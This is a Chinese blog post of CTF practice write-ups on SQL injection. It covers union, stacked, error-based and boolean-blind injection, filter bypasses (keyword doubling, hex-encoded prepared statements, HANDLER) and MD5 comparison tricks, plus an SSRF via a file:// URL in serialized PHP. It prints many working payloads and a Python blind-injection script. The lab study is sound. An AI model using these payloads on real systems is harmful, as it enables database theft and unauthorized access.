---
title: sql 刷题
date: '2025-05-09 09:32:53'
updated: '2025-05-09 09:33:34'
permalink: /post/sql-question-brushing-z1s7uky.html
comments: true
toc: true
---



# sql 刷题

### [极客大挑战 2019]EasySQL

这道题一看就是sql注入，进入之后直接就想到刚学的

```
marin' or 1=1 --
```

但是发现无法成功，查找发现在sql中，注释符除了`--`​还有`#`​号

```
marin' or 1=1 #
```

### [SUCTF 2019]EasySQL

这题直接不会orz，查wp发现是不懂的堆叠查询

```
1; show databases;
```

先查数据库

![](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/679219bdd0e0a243d4f7287a.png)

```
1; show tables;
```

接着查表名

![](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/679219ded0e0a243d4f72882.png)

看到了flag，但是flag好像被过滤了

这里后面的就不是很懂，主要是看到的都是猜测后端查询的语句是

```sql
sql=select.post[‘query’]."||flag from Flag"
```

然后输入

```
*,1
```

语句就会变成

```sql
select * , 1||flag from Flag
select * , 1 from Flag
```

这个就会返回flag所有的列以及一个额外的列1

还有一种方法

```sql
1;set sql_mode=PIPES_AS_CONCAT;select 1
```

这个方法也是利用堆叠，设置sql的模式，将管道符`||`​视为连接符，之后就变成了

```sql
select concat(1,flag) from Flag 
```

### [极客大挑战 2019]LoveSQL

拿到题，和之前有题的页面一样，尝试使用万能密码失败，在用户名处使用成功，观察url，发现是使用get传，尝试sql注入

报错所以是3

```
?username=1%27+order by 4%23&password=asd
```

数据库名和3成功在页面上显示出来

```
?username=1%27+union select 1,database(),3%23&password=asd
```

然后就是常规的注入

获取表名

```
?username=1%27+union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema='geek' %23&password=asd
```

获取列名

```
?username=1%27+union select 1,database(),group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1' %23&password=asd
```

获取数据

```
?username=1%27+union select 1,database(),group_concat(username,id,password) from l0ve1ysq1 %23&password=asd
```

### [强网杯 2019]随便注

注入发现有过滤，一开始使用order by确定了只有2列，但是使用union的时候出问题了

```
?inject=1' union select 1,2#
```

![image-20250131105729216](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250131105729216.png)

发现被过滤了

尝试使用堆叠注入

![image-20250131105816144](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250131114222113.png)

```
?inject=1%27;show columns from `1919810931114514`%23
```

![image-20250131114222113](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250131112930603.png)

![image-20250131114625294](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250131105816144.png)

发现了flag的，但是不清楚怎么获取，查看wp思路

在另一个word表中有两个字段，而数字中只有一个字段，一开始使用order by发现有两个字段，所以这里应该是从word表中取出东西，而且word中的data和数字中的flag都是varchar字段，所以wp的思路是使用`rename`​修改表名，把数字表改为`words`​

wp的payload是

```
1';
rename table words to None; 
rename table `1919810931114514` to words;
alter table words add id int unsigned not NULL auto_increment primary key;
alter table words change flag data varchar(20);#
```

> 两个rename修改表名
>
> ```sql
> alter table words add id int unsigned not NULL auto_increment primary key;
> ```
>
> 因为原words表中有id字段，这里使用alter在新words中添加一个名为id的列  
> int unsigned：数据类型  
> not NULL：该列不为空  
> auto_increment：该列的值自动递增  
> primary key：设置为主键
>
> ```sql
> alter table words change flag data varchar(20);
> ```
>
> 将flag列重命名为data列，并修改数据类型

成功获取flag

![image-20250131112930603](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250131114625294.png)

还看到另一个方法

因为select被过滤了，考虑用编码进行绕过

```sql
select * from `1919810931114514`
```

使用hex加密

```
0x73656c656374202a2066726f6d20603139313938313039333131313435313460
```

最终

```
1';
Set@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;
prepare execsql from @a;
execute execsql;#
```

> ```
> Set@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;
> ```
>
> 设置一个变量@a，并赋值
>
> ```
> prepare execsql from @a;
> ```
>
> 这个是预处理语句，将@a的值（解码后的sql语句）作为预处理语句的内容，命名为execsql
>
> ```
> execute execsql;
> ```
>
> 执行预处理语句

### [极客大挑战 2019]BabySQL

注了半天，没想明白怎么注的，查的wp

发现原来是被过滤成空格了，如select、union 、or等都被变成空格了，这里学到一个新的绕过方法：双写绕过  
原理很简单，就是网站的过滤有时候可能没那么严谨，只会过滤掉一些关键词，我们找到这些关键词，如select，就可以用`seselectlect`​，当过滤掉select时，剩下的字符串拼接在一起，就会恢复成原始有效的关键字，进行绕过

```
?username=1%2B&password=admin' oorrder bbyy 4 --+
```

这里因为过滤掉了or，所以使用order的时候就回先过滤掉or，只要绕过or就会拼接成order

```
?username=1+%2B&password=admin' uunionnion seselectlect 1,2,3--+
```

之后都是常规的方法

```
?username=1%2B&password=admin' uunionnion seselectlect 1,database(),group_concat(table_name) ffromrom infoorrmation_schema.tables whwhereere table_schema='geek'--+
```

```
?username=1%2B&password=admin' uunionnion seselectlect 1,database(),group_concat(column_name) ffromrom infoorrmation_schema.columns whwhereere table_name='b4bsql'--+
```

```
?username=1%2B&password=admin' uunionnion seselectlect 1,database(),group_concat(id,username,passwoorrd) ffromrom b4bsql--+
```

最后得到flag

### [极客大挑战 2019]HardSQL

尝试了双写绕过，union啥的都不行，查wp发现是空格被过滤了

> 这里使用`()`​来绕过空格，括号是用来包含子查询的，任何可以计算出结果的语句都可以用括号括起来，括号两端可以没有多余的空格

是url编码的问题  
这题和之前不一样，如果不url编码就绕过不了

![image-20250210102242526](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250210102242526.png)

![image-20250210110316017](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250210102309753.png)

然后继续尝试，使用报错注入

```
?username=111'or(updatexml(1,concat(0x7e,database(),0x7e),1))%23
```

查到数据库名geek

然后这里好像还过滤了=号，所以查表名要换`like`​用法

> like可以用来筛选特定的记录

```
?username=111'or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like('geek')),0x7e),1))%23
```

![image-20250210110052641](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250210110316017.png)

```
?username=111'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))%23
```

![image-20250210102309753](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250210110052641.png)

```
?username=111'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))%23
```

![image-20250210110622237](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250210110622237.png)

这里发现flag显示不全，发现要用`substring`​于`mid`​来绕过，但是被过滤了，这里就可以用`right`​和`left`​来绕过

这里要拿到右边的flag

```
?username=111'or(updatexml(1,concat(0x7e,(select(right(password,25))from(H4rDsq1)),0x7e),1))%23
```

成功获取到完整flag

![image-20250207174248753](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250210111352198.png)

![image-20250314213021135](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250314213021135.png)

### [BJDCTF2020]Easy MD5

拿到题目，试了sql，试了命令注入，但是都没有回显，蒙了，查源码没发现东西，只知道传入的是password参数

查看wp，才知道在回显处有提示

![image-20250207165217996](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250207165217996.png)

```sql
 select * from 'admin' where password=md5($pass,true)
```

> md5($pass, true)：这个后面的true默认值是false，就会返回32字符的hex字符串
>
> 如果为true，就会返回hex的二进制数据（RAW格式）

就是sql注入，但是注入的内容被md5加密了

所以为了绕过这个，需要被md5加密之后得到的值变为raw格式后让原查询句子变为

```sql
 select * from 'admin' where password='' or '1'
```

后面是什么数字都行

这里想用代码跑一个出来，不过想想就知道不可能，于是就用了wp中给的，记住其实应该就行（

```
ffifdyop
md5值为：
'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c
```

成功进入下一个页面

```php
<!--
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
-->

```

这里在回显处找到这个被注释的代码，要求a和b不同，但是a和b的md5值要相同，这里想到的是==是弱比较，如果前面和后面得到的md5值的前面数值都一样就行，不过看wp的解释是使用科学计数法，也是弱比较的一种，md5值为0e的时候会视为科学计数法，无论后面的值是什么，0的多少次方都是0，就能绕过了

```
QNKCDZO和s878926199a
```

得到最后一个

```php
<?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
}
```

这里是强比较

这里学到了一个新的方法

数组绕过

在php中，如果传入`?a[]=1&b[]=2`​这样的，php会自动解析为数组  
a[]=1会把a转为一个数组，即`$a=[1]`​，b也是一样的

但是在web中，如果应用没有正确处理数组，就会出现漏洞

* 应用要检查a的值是否为特定值，但是没有考虑是不是数组，就会被绕过验证
* md5函数在接受参数的时候，如果传入的不是字符串，而是数组，就无法解出数值，并且不会报错

这题就利用这一点，使用数组绕过，就可以获得flag，并且第二个步骤也可以使用

![image-20250212155634155](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250207174248753.png)

### [GXYCTF2019]BabySQli

测试，发现=、（）、or被过滤了

使用union 判断字段数是3个

![image-20250212155331341](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250212155331341.png)

在这个页面的源代码中有提示（没发现，看wp才知道

![image-20250210111352198](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250212155634155.png)

解码后得到

```sql
select * from user where username = '$name'
```

然后继续使用union判断字段，猜测使用admin

![image-20250212160412022](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250212160412022.png)

根据报错user字段是在第二个

后面就全是查wp的（看的wp都是查看源码发现要传入md5值的

* sqli有个特性：在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据

所以猜测第3个字段就是密码的字段，这里查看题目github源码发现password被md5加密，所以传入的pw参数会被md5加密后，再和数据库中比较

根据特性，联合查询时传入一个不存在数据的md5值，就会被存放到password的数据库中，然后pw传入这个值，就能成功登录

这里的`c4ca4238a0b923820dcc509a6f75849b`​就是1的md5值

```sql
name=1'union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b'#&pw=1
```

![image-20250212161315813](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250212161315813.png)

### [GYCTF2020]Blacklist

测试了是字符型注入，尝试union注入后得到提示

```
return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
```

然后继续尝试，用堆叠注入成功了

查数据库

```
1';show databases--+
```

![image-20250212171657465](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250212171657465.png)

查表名

```
1';show tables--+
```

![image-20250212171746388](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250212171746388.png)

查列名（这里要用反引号

```
1';show columns from `FlagHere`--+
```

![image-20250213202258020](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250212172043889.png)

因为之前发现rename被过滤了，所以之前做过的使用rename改名的方法不行了

查wp，发现一个新方法

> **handler**命令
>
> 查询规则
>
> ```sql
> handler table_name open;
> handler table_name read first;
> handler table_name close;
> ```
>
> 打开数据库，读取第一行数据，读取成功后关闭
>
> ```sql
> handler table_name open;
> handler table_name read next;
> handler table_name close;
> ```
>
> 打开数据库，开始循环读取，读取成功后关闭

构造payload后成功读取flag

```
1';handler FlagHere open;handler FlagHere read next; handler FlagHere close;--+
```

### [CISCN2019 华北赛区 Day2 Web1]Hack World

![image-20250213202134088](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250213202134088.png)

拿到题目发现表名和列名都给了，然后开始测试，发现很多都给过滤了，拿burp测了测，长度为525的没被过滤，但是都么啥有用的东西

![image-20250213202731621](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250213202258020.png)

但是发现在数字后面加个单引号，就会触发这个，不知道是为什么

![image-20250212172043889](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250213202410839.png)

然后又测试了一下，发现1会输出一句话

![image-20250213202410839](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250213202731621.png)

接着尝试，发现传入一个true也可以，那这里其实可以用布尔盲注

![image-20250215113024445](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250213202755975.png)

构造payload

```
0^(ascii(substr((payload),1,1))=102)
```

```
0^(ascii(substr((select(flag)from(flag)),1,1))=102)
```

> ​`^`​是异或的符号，所以这里使用0和后面的结果异或，当后面的结果为true时，返回1，为false时，为0
>
> ​`(select(flag)from(flag))`​从flag表中寻找flag列
>
> ​`substr((payload),1,1)`​用substr从第一个字符开始截取一个字符
>
> ​`ascii()=102`​判断这个字符的值是否等于102

本来想用burp来爆破的，但是想了想flag应该挺长，爆出来还要自己拼，就写了一个脚本

```python
import requests

url = 'http://893c0d7b-a16b-477b-bbf1-bcae5fed8692.node5.buuoj.cn:81/index.php'

flag = ""
num = 1

while (True):
    for i in range(32, 128):
        key = {
        'id': f"0^(ascii(substr((select(flag)from(flag)),{num},1))={i})"
        }
        resp = requests.post(url, data=key)
        resp.encoding = 'utf-8'
        if 'Hello' in resp.text:
            print('true')
            flag += chr(i)
            print(flag)
            num += 1
            break
        
    if "}" in flag:
        print(''.join(flag))
        break

```

![image-20250213202755975](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250213203450873.png)

成功爆到flag

### [网鼎杯 2018]Fakebook

看题目，没找到有用的东西，使用dirsearch扫描

![image-20250215112400619](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250215112219717.png)

发现了robots.txt，其他的访问都没有东西

![image-20250213203450873](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250215112252763.png)

找到了user.php.bak，下载下来查看

```php
<?php


class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```

登录进去，只有名字可以点，这个应该就是php中get url中拿到的

![image-20250215112252763](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250215112400619.png)

点进去，发现有个参数，想到之前扫到的db.php，尝试注入

![image-20250215112438137](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250215112646132.png)

报错确定是sql注入，然后尝试了一下，发现是数字型的

![image-20250215112752693](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250215112752693.png)

![image-20250215112646132](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250215112729910.png)

使用and，成功确定

![image-20250215112729910](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250215113024445.png)

确定列数

```
?no=1 order by 4
```

使用union select 时不行，单独使用union和select都不会触发，应该是过滤了union select，中间加个注释符

![image-20250215112846351](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250215112846351.png)

```
?no=-1 union/**/select 1,2,3,4
```

看到2是显示出来的

![image-20250215112219717](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250215112438137.png)

爆数据库

```
?no=-1 union/**/select 1,database(),3,4
```

爆表

```
?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='fakebook'
```

爆列

```
?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'
```

```
no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS
```

爆数据

```
?no=-1 union/**/select 1,concat(no,'~',username,'~',passwd,'~',data),3,4 from users
```

得到

```
1~marin~3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2~O:8:"UserInfo":3:{s:4:"name";s:5:"marin";s:3:"age";i:123;s:4:"blog";s:21:"https://wwwmarin.xyz/";}
```

看到最后的data就是序列化的数据

猜测这个应该就是第4个数据传进去的，构造序列化

```php
<?php
class UserInfo
{
    public $name = "marin";
    public $age = 0;
    public $blog = "www.baidu.com";
}

$a = new UserInfo();
$b = serialize($a);
echo $b;
```

使用百度网页试试

![image-20250215114117646](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250215114117646.png)

成功修改，查看源代码，能发现已经被base64加密了，现在就可以查看flag.php

![image-20250215114132425](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250215114132425.png)

并且根据前面的报错知道了 **/var/www/html/view.php**这个路径，所以flag.php也应该在这里

最后payload

```
?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"marin";s:3:"age";i:0;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
```

得到flag

这题查wp发现是算ssrf，看wp发现`curl_exec()`​，这个php函数可能会导致ssrf漏洞

> ​**​`curl_exec()`​** ​会通过 `curl_setopt()`​ 配置的选项，向指定url发送请求，所以可能会导致ssrf

这题还有一个方法，因为没有过滤load_file，所以这个可以直接访问

```
?no=-1 union/**/select 1,load_file("/var/www/html/flag.php"),3,4
```

### [SWPUCTF 2021 新生赛]sql

拿到题目，f12看到参数是wllm

然后发现好像是前端js的限制

![image-20250325185947660](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250325185947660.png)

把空格限制了

使用`/**/`​绕过

```
1'/**/order/**/by/**/4/**/%23
```

![image-20250325190154740](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250325190154740.png)

```
-1'/**/union/**/select/**/1,database(),3/**/%23
```

![image-20250325190232796](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250325190232796.png)

爆表名时发现=被过滤了，用like

```
?wllm=-1%27/**/union/**/select/**/1,database(),group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/'test_db'/**/%23
```

![image-20250325191004306](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250325191004306.png)

```
?wllm=-1%27/**/union/**/select/**/1,database(),group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/%27LTLT_flag%27/**/%23
```

![image-20250325192426535](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250325192426535.png)

```
?wllm=-1%27/**/union/**/select/**/1,database(),group_concat(flag)/**/from/**/LTLT_flag/**/%23
```

![image-20250325193533294](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250325193533294.png)

发现flag只有一半，发现right和substring都被过滤了，找了半天找到了mid函数

```
?wllm=-1%27/**/union/**/select/**/1,database(),mid(group_concat(flag),21)/**/from/**/LTLT_flag/**/%23
```

多读两次拿到了flag

### [Auroractf 2024]SSSQQQLLL!!!

sql，拿到测试发现是堆叠注入

```
1';show databases;#
```

![image-20250311182418251](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250311182418251.png)

```
1';show tables from englishdb;#
```

![image-20250311182449533](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250311182449533.png)

```
1';show columns from score;#
```

![image-20250311182523084](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250311182523084.png)

想查看里面的数据，使用select发现了waf

```
呼呼呼, 给你一点waf: return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
```

查笔记查到一个用set和十六进制来绕过的，又发现一个waf，不过有提示，查看这个函数发现这个函数区分大小写的，所以只要换一下就可以绕过了

```
再给你一点waf: return strstr($inject, "set") || strstr($inject, "prepare"); 不妨查查strstr函数的用法?
```

​`select * from score`​->`0x73656c656374202a2066726f6d2073636f7265`​

```
1';Set@a=0x73656c656374202a2066726f6d2073636f7265;Prepare execsql from @a;execute execsql;#
```

![image-20250311182847159](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250311182847159.png)

获取成绩需要clown的成绩，所以猜测将error233和clown名字替换一下

```sql
UPDATE score SET name = 'clown' WHERE name = 'Err0r233';
#0x5550444154452073636f726520534554206e616d65203d2027636c6f776e27205748455245206e616d65203d20274572723072323333273b0d0a
```

```
1';Set@a=0x5550444154452073636f726520534554206e616d65203d2027636c6f776e27205748455245206e616d65203d20274572723072323333273b0d0a;Prepare execsql from @a;execute execsql;#
```

成功得到flag

‍
